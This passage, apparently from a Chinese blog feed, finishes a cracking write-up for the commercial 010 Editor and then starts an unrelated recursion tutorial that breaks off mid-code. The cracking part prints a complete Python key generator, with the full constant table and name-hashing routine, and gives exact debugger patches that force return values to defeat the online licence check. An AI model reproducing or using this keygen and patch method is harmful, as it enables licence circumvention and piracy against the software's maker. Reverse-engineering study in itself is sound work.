class="hljs-number">0xA</span>):           <span class="hljs-comment"># 根据jbe跳转</span><br>            k[<span class="hljs-number">0</span>] = k0<br>            k[<span class="hljs-number">6</span>] = k6<br></code></pre></td></tr></table></figure><p>到这里基本上可以对注册机编写，先捋一下思路，要是思路还不清晰，可以再多走几遍程序</p><blockquote><p>程序先对k[0]和k[6]进行一个计算处理</p><p>再对k[1]、k[2]、k[5]、k[7]计算得出一个商</p><p>然后根据商、用户名、和内存中的一个数组计算出k[4]、k[5]、k[6]、k[7]的值</p><p>计算出的值，再与输入的注册码进行比较，比较成功则成功</p></blockquote><p>注册机编写思路：</p><blockquote><p>先随机取一个满足条件的商</p><p>根据商与用户名计算出注册码的后四位</p><p>再根据商反推出k[1]和k[2]</p><p>最后再根据k[6]取一个符合条件的k[0]</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br>tables = [<span class="hljs-number">0x39cb44b8</span>, <span class="hljs-number">0x23754f67</span>, <span class="hljs-number">0x5f017211</span>, <span class="hljs-number">0x3ebb24da</span>, <span class="hljs-number">0x351707c6</span>, <span class="hljs-number">0x63f9774b</span>, <span class="hljs-number">0x17827288</span>, <span class="hljs-number">0x0fe74821</span>,<br>         <span class="hljs-number">0x5b5f670f</span>, <span class="hljs-number">0x48315ae8</span>, <span class="hljs-number">0x785b7769</span>, <span class="hljs-number">0x2b7a1547</span>, <span class="hljs-number">0x38d11292</span>, <span class="hljs-number">0x42a11b32</span>, <span class="hljs-number">0x35332244</span>, <span class="hljs-number">0x77437b60</span>,<br>         <span class="hljs-number">0x1eab3b10</span>, <span class="hljs-number">0x53810000</span>, <span class="hljs-number">0x1d0212ae</span>, <span class="hljs-number">0x6f0377a8</span>, <span class="hljs-number">0x43c03092</span>, <span class="hljs-number">0x2d3c0a8e</span>, <span class="hljs-number">0x62950cbf</span>, <span class="hljs-number">0x30f06ffa</span>,<br>         <span class="hljs-number">0x34f710e0</span>, <span class="hljs-number">0x28f417fb</span>, <span class="hljs-number">0x350d2f95</span>, <span class="hljs-number">0x5a361d5a</span>, <span class="hljs-number">0x15cc060b</span>, <span class="hljs-number">0x0afd13cc</span>, <span class="hljs-number">0x28603bcf</span>, <span class="hljs-number">0x3371066b</span>,<br>         <span class="hljs-number">0x30cd14e4</span>, <span class="hljs-number">0x175d3a67</span>, <span class="hljs-number">0x6dd66a13</span>, <span class="hljs-number">0x2d3409f9</span>, <span class="hljs-number">0x581e7b82</span>, <span class="hljs-number">0x76526b99</span>, <span class="hljs-number">0x5c8d5188</span>, <span class="hljs-number">0x2c857971</span>,<br>         <span class="hljs-number">0x15f51fc0</span>, <span class="hljs-number">0x68cc0d11</span>, <span class="hljs-number">0x49f55e5c</span>, <span class="hljs-number">0x275e4364</span>, <span class="hljs-number">0x2d1e0dbc</span>, <span class="hljs-number">0x4cee7ce3</span>, <span class="hljs-number">0x32555840</span>, <span class="hljs-number">0x112e2e08</span>,<br>         <span class="hljs-number">0x6978065a</span>, <span class="hljs-number">0x72921406</span>, <span class="hljs-number">0x314578e7</span>, <span class="hljs-number">0x175621b7</span>, <span class="hljs-number">0x40771dbf</span>, <span class="hljs-number">0x3fc238d6</span>, <span class="hljs-number">0x4a31128a</span>, <span class="hljs-number">0x2dad036e</span>,<br>         <span class="hljs-number">0x41a069d6</span>, <span class="hljs-number">0x25400192</span>, <span class="hljs-number">0x00dd4667</span>, <span class="hljs-number">0x6afc1f4f</span>, <span class="hljs-number">0x571040ce</span>, <span class="hljs-number">0x62fe66df</span>, <span class="hljs-number">0x41db4b3e</span>, <span class="hljs-number">0x3582231f</span>,<br>         <span class="hljs-number">0x55f6079a</span>, <span class="hljs-number">0x1ca70644</span>, <span class="hljs-number">0x1b1643d2</span>, <span class="hljs-number">0x3f7228c9</span>, <span class="hljs-number">0x5f141070</span>, <span class="hljs-number">0x3e1474ab</span>, <span class="hljs-number">0x444b256e</span>, <span class="hljs-number">0x537050d9</span>,<br>         <span class="hljs-number">0x0f42094b</span>, <span class="hljs-number">0x2fd820e6</span>, <span class="hljs-number">0x778b2e5e</span>, <span class="hljs-number">0x71176d02</span>, <span class="hljs-number">0x7fea7a69</span>, <span class="hljs-number">0x5bb54628</span>, <span class="hljs-number">0x19ba6c71</span>, <span class="hljs-number">0x39763a99</span>,<br>         <span class="hljs-number">0x178d54cd</span>, <span class="hljs-number">0x01246e88</span>, <span class="hljs-number">0x3313537e</span>, <span class="hljs-number">0x2b8e2d17</span>, <span class="hljs-number">0x2a3d10be</span>, <span class="hljs-number">0x59d10582</span>, <span class="hljs-number">0x37a163db</span>, <span class="hljs-number">0x30d6489a</span>,<br>         <span class="hljs-number">0x6a215c46</span>, <span class="hljs-number">0x0e1c7a76</span>, <span class="hljs-number">0x1fc760e7</span>, <span class="hljs-number">0x79b80c65</span>, <span class="hljs-number">0x27f459b4</span>, <span class="hljs-number">0x799a7326</span>, <span class="hljs-number">0x50ba1782</span>, <span class="hljs-number">0x2a116d5c</span>,<br>         <span class="hljs-number">0x63866e1b</span>, <span class="hljs-number">0x3f920e3c</span>, <span class="hljs-number">0x55023490</span>, <span class="hljs-number">0x55b56089</span>, <span class="hljs-number">0x2c391fd1</span>, <span class="hljs-number">0x2f8035c2</span>, <span class="hljs-number">0x64fd2b7a</span>, <span class="hljs-number">0x4ce8759a</span>,<br>         <span class="hljs-number">0x518504f0</span>, <span class="hljs-number">0x799501a8</span>, <span class="hljs-number">0x3f5b2cad</span>, <span class="hljs-number">0x38e60160</span>, <span class="hljs-number">0x637641d8</span>, <span class="hljs-number">0x33352a42</span>, <span class="hljs-number">0x51a22c19</span>, <span class="hljs-number">0x085c5851</span>,<br>         <span class="hljs-number">0x032917ab</span>, <span class="hljs-number">0x2b770ac7</span>, <span class="hljs-number">0x30ac77b3</span>, <span class="hljs-number">0x2bec1907</span>, <span class="hljs-number">0x035202d0</span>, <span class="hljs-number">0x0fa933d3</span>, <span class="hljs-number">0x61255df3</span>, <span class="hljs-number">0x22ad06bf</span>,<br>         <span class="hljs-number">0x58b86971</span>, <span class="hljs-number">0x5fca0de5</span>, <span class="hljs-number">0x700d6456</span>, <span class="hljs-number">0x56a973db</span>, <span class="hljs-number">0x5ab759fd</span>, <span class="hljs-number">0x330e0be2</span>, <span class="hljs-number">0x5b3c0ddd</span>, <span class="hljs-number">0x495d3c60</span>,<br>         <span class="hljs-number">0x53bd59a6</span>, <span class="hljs-number">0x4c5e6d91</span>, <span class="hljs-number">0x49d9318d</span>, <span class="hljs-number">0x103d5079</span>, <span class="hljs-number">0x61ce42e3</span>, <span class="hljs-number">0x7ed5121d</span>, <span class="hljs-number">0x14e160ed</span>, <span class="hljs-number">0x212d4ef2</span>,<br>         <span class="hljs-number">0x270133f0</span>, <span class="hljs-number">0x62435a96</span>, <span class="hljs-number">0x1fa75e8b</span>, <span class="hljs-number">0x6f092fbe</span>, <span class="hljs-number">0x4a000d49</span>, <span class="hljs-number">0x57ae1c70</span>, <span class="hljs-number">0x004e2477</span>, <span class="hljs-number">0x561e7e72</span>,<br>         <span class="hljs-number">0x468c0033</span>, <span class="hljs-number">0x5dcc2402</span>, <span class="hljs-number">0x78507ac6</span>, <span class="hljs-number">0x58af24c7</span>, <span class="hljs-number">0x0df62d34</span>, <span class="hljs-number">0x358a4708</span>, <span class="hljs-number">0x3cfb1e11</span>, <span class="hljs-number">0x2b71451c</span>,<br>         <span class="hljs-number">0x77a75295</span>, <span class="hljs-number">0x56890721</span>, <span class="hljs-number">0x0fef75f3</span>, <span class="hljs-number">0x120f24f1</span>, <span class="hljs-number">0x01990ae7</span>, <span class="hljs-number">0x339c4452</span>, <span class="hljs-number">0x27a15b8e</span>, <span class="hljs-number">0x0ba7276d</span>,<br>         <span class="hljs-number">0x60dc1b7b</span>, <span class="hljs-number">0x4f4b7f82</span>, <span class="hljs-number">0x67db7007</span>, <span class="hljs-number">0x4f4a57d9</span>, <span class="hljs-number">0x621252e8</span>, <span class="hljs-number">0x20532cfc</span>, <span class="hljs-number">0x6a390306</span>, <span class="hljs-number">0x18800423</span>,<br>         <span class="hljs-number">0x19f3778a</span>, <span class="hljs-number">0x462316f0</span>, <span class="hljs-number">0x56ae0937</span>, <span class="hljs-number">0x43c2675c</span>, <span class="hljs-number">0x65ca45fd</span>, <span class="hljs-number">0x0d604ff2</span>, <span class="hljs-number">0x0bfd22cb</span>, <span class="hljs-number">0x3afe643b</span>,<br>         <span class="hljs-number">0x3bf67fa6</span>, <span class="hljs-number">0x44623579</span>, <span class="hljs-number">0x184031f8</span>, <span class="hljs-number">0x32174f97</span>, <span class="hljs-number">0x4c6a092a</span>, <span class="hljs-number">0x5fb50261</span>, <span class="hljs-number">0x01650174</span>, <span class="hljs-number">0x33634af1</span>,<br>         <span class="hljs-number">0x712d18f4</span>, <span class="hljs-number">0x6e997169</span>, <span class="hljs-number">0x5dab7afe</span>, <span class="hljs-number">0x7c2b2ee8</span>, <span class="hljs-number">0x6edb75b4</span>, <span class="hljs-number">0x5f836fb6</span>, <span class="hljs-number">0x3c2a6dd6</span>, <span class="hljs-number">0x292d05c2</span>,<br>         <span class="hljs-number">0x052244db</span>, <span class="hljs-number">0x149a5f4f</span>, <span class="hljs-number">0x5d486540</span>, <span class="hljs-number">0x331d15ea</span>, <span class="hljs-number">0x4f456920</span>, <span class="hljs-number">0x483a699f</span>, <span class="hljs-number">0x3b450f05</span>, <span class="hljs-number">0x3b207c6c</span>,<br>         <span class="hljs-number">0x749d70fe</span>, <span class="hljs-number">0x417461f6</span>, <span class="hljs-number">0x62b031f1</span>, <span class="hljs-number">0x2750577b</span>, <span class="hljs-number">0x29131533</span>, <span class="hljs-number">0x588c3808</span>, <span class="hljs-number">0x1aef3456</span>, <span class="hljs-number">0x0f3c00ec</span>,<br>         <span class="hljs-number">0x7da74742</span>, <span class="hljs-number">0x4b797a6c</span>, <span class="hljs-number">0x5ebb3287</span>, <span class="hljs-number">0x786558b8</span>, <span class="hljs-number">0x00ed4ff2</span>, <span class="hljs-number">0x6269691e</span>, <span class="hljs-number">0x24a2255f</span>, <span class="hljs-number">0x62c11f7e</span>,<br>         <span class="hljs-number">0x2f8a7dcd</span>, <span class="hljs-number">0x643b17fe</span>, <span class="hljs-number">0x778318b8</span>, <span class="hljs-number">0x253b60fe</span>, <span class="hljs-number">0x34bb63a3</span>, <span class="hljs-number">0x5b03214f</span>, <span class="hljs-number">0x5f1571f4</span>, <span class="hljs-number">0x1a316e9f</span>,<br>         <span class="hljs-number">0x7acf2704</span>, <span class="hljs-number">0x28896838</span>, <span class="hljs-number">0x18614677</span>, <span class="hljs-number">0x1bf569eb</span>, <span class="hljs-number">0x0ba85ec9</span>, <span class="hljs-number">0x6aca6b46</span>, <span class="hljs-number">0x1e43422a</span>, <span class="hljs-number">0x514d5f0e</span>,<br>         <span class="hljs-number">0x413e018c</span>, <span class="hljs-number">0x307626e9</span>, <span class="hljs-number">0x01ed1dfa</span>, <span class="hljs-number">0x49f46f5a</span>, <span class="hljs-number">0x461b642b</span>, <span class="hljs-number">0x7d7007f2</span>, <span class="hljs-number">0x13652657</span>, <span class="hljs-number">0x6b160bc5</span>,<br>         <span class="hljs-number">0x65e04849</span>, <span class="hljs-number">0x1f526e1c</span>, <span class="hljs-number">0x5a0251b6</span>, <span class="hljs-number">0x2bd73f69</span>, <span class="hljs-number">0x2dbf7acd</span>, <span class="hljs-number">0x51e63e80</span>, <span class="hljs-number">0x5cf2670f</span>, <span class="hljs-number">0x21cd0a03</span>,<br>         <span class="hljs-number">0x5cff0261</span>, <span class="hljs-number">0x33ae061e</span>, <span class="hljs-number">0x3bb6345f</span>, <span class="hljs-number">0x5d814a75</span>, <span class="hljs-number">0x257b5df4</span>, <span class="hljs-number">0x0a5c2c5b</span>, <span class="hljs-number">0x16a45527</span>, <span class="hljs-number">0x16f23945</span><br>         ]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">guess_quo</span>():</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        i = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">0x10000</span>)      <span class="hljs-comment"># 这个i，就是(0x100*(k[1]^k[7])+(k[2]^k[5])</span><br>        eax = (((i ^ <span class="hljs-number">0x7892</span>) + <span class="hljs-number">0x4d30</span>) ^ <span class="hljs-number">0x3421</span>) &amp; <span class="hljs-number">0xffff</span><br>        <span class="hljs-keyword">if</span> eax % <span class="hljs-number">11</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (eax / <span class="hljs-number">0xb</span> &lt;= <span class="hljs-number">0x3E8</span>):<br>            <span class="hljs-keyword">return</span> i, eax // <span class="hljs-number">0xb</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">base_name_calc</span>(<span class="hljs-params">username, a2, a3, a4</span>):</span><br>    result = <span class="hljs-number">0</span><br>    username_len = <span class="hljs-built_in">len</span>(username)<br>    <span class="hljs-keyword">if</span> username_len &gt; <span class="hljs-number">0</span>:<br>        v7 = <span class="hljs-number">0</span><br>        v9 = (<span class="hljs-number">0xf</span> * a4) &amp; <span class="hljs-number">0xff</span><br>        v10 = (<span class="hljs-number">0x11</span> * a3) &amp; <span class="hljs-number">0xff</span><br>        v11 = <span class="hljs-number">0</span><br>        v12 = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> v7 &lt; username_len:<br>            upper_char = <span class="hljs-built_in">ord</span>(username[v7].upper())  <span class="hljs-comment"># upper_char = v13</span><br>            v14 = (result + tables[upper_char]) &amp; <span class="hljs-number">0xffffffff</span>    <span class="hljs-comment"># 防止溢出</span><br>            <span class="hljs-keyword">if</span> a2:<br>                v15 = (tables[v9] + tables[v10] + tables[upper_char+<span class="hljs-number">0x2f</span>] * (v14 ^ tables[upper_char+<span class="hljs-number">0xd</span>])) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v11<br>            <span class="hljs-keyword">else</span>:       <span class="hljs-comment"># 其实这个可以忽略，因为a2始终为真</span><br>                v15 = (tables[v9] + tables[v10] + tables[upper_char + <span class="hljs-number">0x17</span>] * (v14 ^ tables(upper_char+<span class="hljs-number">0x3f</span>))) &amp; <span class="hljs-number">0xffffffff</span><br>                v16 = v12<br>            result = tables[v16]+v15<br>            v7 = v7 + <span class="hljs-number">1</span><br>            v11 = (v11 + <span class="hljs-number">19</span>) % <span class="hljs-number">0x100</span><br>            v10 = (v10 + <span class="hljs-number">9</span>) % <span class="hljs-number">0x100</span><br>            v9 = (v9 + <span class="hljs-number">13</span>) % <span class="hljs-number">0x100</span><br>            v12 = (v12 + <span class="hljs-number">7</span>) % <span class="hljs-number">0x100</span><br>        <span class="hljs-keyword">return</span> result &amp; <span class="hljs-number">0xffffffff</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> result<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>    name = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Input a username:&quot;</span>)<br>    k = [<span class="hljs-number">0</span>] * <span class="hljs-number">8</span><br>    k[<span class="hljs-number">3</span>] = <span class="hljs-number">0x9c</span>     <span class="hljs-comment"># 0x9c版本注册码的算法</span><br>    v8,v9 = guess_quo()<br>    result = base_name_calc(name, <span class="hljs-literal">True</span>, <span class="hljs-number">0</span>, v9)<br>    k[<span class="hljs-number">4</span>] = result &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">5</span>] = (result &gt;&gt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">6</span>] = (result &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">7</span>] = (result &gt;&gt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xff</span><br>    k[<span class="hljs-number">2</span>] = k[<span class="hljs-number">5</span>] ^ (v8 % <span class="hljs-number">0x100</span>)  <span class="hljs-comment"># 回顾一下上面取随机值i的时候</span><br>    k[<span class="hljs-number">1</span>] = k[<span class="hljs-number">7</span>] ^ (v8 &gt;&gt; <span class="hljs-number">8</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        k[<span class="hljs-number">0</span>] = <span class="hljs-built_in">int</span>(random.random() * <span class="hljs-number">256</span>)<br>        v10 = (((k[<span class="hljs-number">6</span>] ^ k[<span class="hljs-number">0</span>]) ^ <span class="hljs-number">0x18</span> + <span class="hljs-number">61</span>) % <span class="hljs-number">0x100</span>) ^ <span class="hljs-number">0xa7</span><br>        <span class="hljs-keyword">if</span> v10 &gt;= <span class="hljs-number">10</span>:<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):  <span class="hljs-comment"># 使输出更完美</span><br>        <span class="hljs-keyword">if</span> k[i] &lt; <span class="hljs-number">16</span>:<br>            k[i] = <span class="hljs-string">&#x27;0&#x27;</span> + <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>].upper()<br>        <span class="hljs-keyword">else</span>:<br>            k[i] = <span class="hljs-built_in">hex</span>(k[i])[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>].upper()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Password: %s%s-%s%s-%s%s-%s%s&#x27;</span> % (k[<span class="hljs-number">0</span>], k[<span class="hljs-number">1</span>], k[<span class="hljs-number">2</span>], k[<span class="hljs-number">3</span>], k[<span class="hljs-number">4</span>], k[<span class="hljs-number">5</span>], k[<span class="hljs-number">6</span>], k[<span class="hljs-number">7</span>]))<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<span class="hljs-comment"># 入口</span><br>   main()<br></code></pre></td></tr></table></figure><h4 id="4-去除网络验证"><a href="#4-去除网络验证" class="headerlink" title="4.去除网络验证"></a>4.去除网络验证</h4><p>这块，如果不是看文章的话，我自己来指定不会写，作为菜鸡的我根本想不到好吧</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/42.png"></p><p>不过既然看到了大佬的操作，那就学一下，虽然平常捡垃圾用不到，但多学点总归不是错的。</p><p>这里由于虚拟机的网络有点小问题，导致虚拟机中一直不谈网络校验那个错误位置，哦！这么看我前面的所有分析过程全部在无网情况下进行，难度有所降低，就这还看了那么久，真是菜中菜。虚拟机不行，所以只能在物理机中进行操作。打开010Editor，xdbg进行挂载，将程序走到如下位置</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/43.png"></p><p>程序正常情况下这两个函数都要返回0x2D(别问，问就是拿个正确的注册码去虚拟机试一下)，这里程序返回0x113，是个问题，记录一下，程序继续往下走，走到一个jns，这里需要看一下</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/44.png"></p><p>OK，分析结束，继续往下走，看看是不是跟我们想的一样，果然预期一样，程序走到如下图位置错误信息就跳出来了，所以，那个jns不能跳，跳了就GG</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/45.png"></p><p>这里有过一次将跳转注释成nop尝试，程序在每次打开的时候都会跳出验证页面，所以这里直接看jns上面的那个函数。jns上面是个<code>test eax,eax</code>，只要eax的值不为0，jns就不会跳。</p><p>重新加载程序，进入<code>call 010editor.7FF611CA94AD</code>位置，开始单步，走了一圈发现没有找到能够直接控制eax值的位置，既然这样，那就直接在程序的最后，加个<code>mov eax,0x2</code>，因为要求的是大于0就可以了，所以只要是个大于0的数就行</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/46.png"></p><p>改完之后程序继续往下走，跳转满足，但是有个需要注意的地方就是，接下来还有比较<code>cmp ebx,0xDB</code>，要是ebx不为0xDB，则会报注册码错误。别问为啥知道的，走了很多遍，走的人都麻了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/47.png"></p><p>这里将0x113更改为0xDB，已经有经验了，直接进入该函数更改一下返回的位置就可以了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/48.png"></p><p>重新载入程序，然后跟着修改之后的程序走一下，发现能够成功走到注册码正确的位置，也没有网络验证</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/49.png"></p><p>最后就是修改补丁，保存修改的文件，再用修改后的文件替换掉源文件就算是彻底完工，当然不推荐替换源文件，可以换个文件名，然后更改一下快捷方式中的目标就OK。完工！</p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h4><p>这篇文章，大部分的思路来源于参考链接中的三篇文章，在自己调试以及注册机的编写过程中，遇到了种种问题，也是一点点的解决，一点点的自己尝试，因为有学习到东西，故将此次学习过程记录下来，可以说抄袭，但这次的抄袭算是抄明白了。说白了，还是太菜了</p><p><img src="/2022/01/29/010Editor%E7%A0%B4%E8%A7%A3/50.png"></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><p><a href="https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2">https://bbs.pediy.com/thread-250270.htm#msg_header_h2_2</a></p><p><a href="https://www.52pojie.cn/thread-1557588-1-1.html">https://www.52pojie.cn/thread-1557588-1-1.html</a></p><p><a href="https://blog.csdn.net/weixin_43272781/article/details/101173877">https://blog.csdn.net/weixin_43272781/article/details/101173877</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>被迫的记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>recursion递归算法</title>
    <link href="/2022/01/22/recursion/"/>
    <url>/2022/01/22/recursion/</url>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>刷codewars的时候，碰到一个字符串的全排列，emmm，不会，然后就去寻找了一下解决方法，发现是用递归进行解决(可能有其他方法，但没发现，调用库函数的不算)。然后看了半天别人的思路发现始终有点迷糊，就重新学习了一下递归(我记着我以前会，emmm,可能也是会的不咋滴)。</p><h3 id="递归算法简述"><a href="#递归算法简述" class="headerlink" title="递归算法简述"></a>递归算法简述</h3><p>**递归算法 ** 是指一种通过重复将问题分解为同类的子问题而解决问题的方法，也是指在定义的函数中调用函数自身的方法。递归算法实际上分为两层意思，一个”递”，一个”归”，这也是在后续使用递归算法中的重要地方。</p><p>本文不会对递归的时间复杂度进行分析，因为不会，只是通过几个例子来学习一下如何使用递归算法。</p><p>**递归算法 ** 通常用来解决结构自相似的问题。所谓结构自相似，是指构成原问题的子问题与原问题在结构上相似，可以用类似的方法解决。而在使用递归时，则是通过将问题分解成相同类型的子问题，然后再通过子问题的结果再反推出问题的结果。</p><p><strong>递归算法</strong> 的三步：</p><ol><li>递归函数的参数以及返回值</li><li>确定终止条件</li><li>单层递归的逻辑</li></ol><h3 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h3><h4 id="举例1：n的阶乘"><a href="#举例1：n的阶乘" class="headerlink" title="举例1：n的阶乘"></a>举例1：n的阶乘</h4><p>先对n的阶乘进行分析</p><p><code>n! = n * (n-1) * (n-2) * ······* 2 * 1</code>，相当于下式</p><p><img src="/2022/01/22/recursion/1.png" alt="img"></p><p>假设n=1，则n的阶乘等于1；n=2时，n的阶乘等于2*1=2</p><p>首先确定递归函数的参数以及返回值，既然是n的阶乘，那参数肯定毫无疑问是n(递归函数的参数，如果刚开始不能确定所有，则可以在后续进行补充，不影响的。)，再说返回值，求n的阶乘，返回值指定是阶乘的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#求n的阶乘</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>确定终止条件，已知<code>1!</code>== 1，则可以确定当n==1时，这个递归就可以终止了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n!<br></code></pre></td></tr></table></figure><p>确定单层递归的逻辑，已知<code>n! = n * (n-1) * (n-2) * ······* 2 * 1</code>，使用f(n)来表示n的阶乘，<code>f(n)==n*f(n-1)</code>，当n-1等于1时，则可以直接返回已知的结果。则函数就可以写成如下形式:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params">n</span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> n*f(n-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>要是没理解，先假设n=2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">2</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>*f(<span class="hljs-number">2</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#已知f(1)==1，则相当于直接return 2*1</span><br></code></pre></td></tr></table></figure><p>再看n=3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">f</span>(<span class="hljs-params"><span class="hljs-number">3</span></span>):</span><br>    <span class="hljs-keyword">if</span>(n==<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">3</span>*f(<span class="hljs-number">3</span>-<span class="hljs-number">1</span>)<span class="hljs-comment">#return 3*f(2),调用f()，求f(2),也就再返回到上面的式子中</span><br></code></pre></td></tr></table></figure><p>再假设n=5，则函数具体的执行流程如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 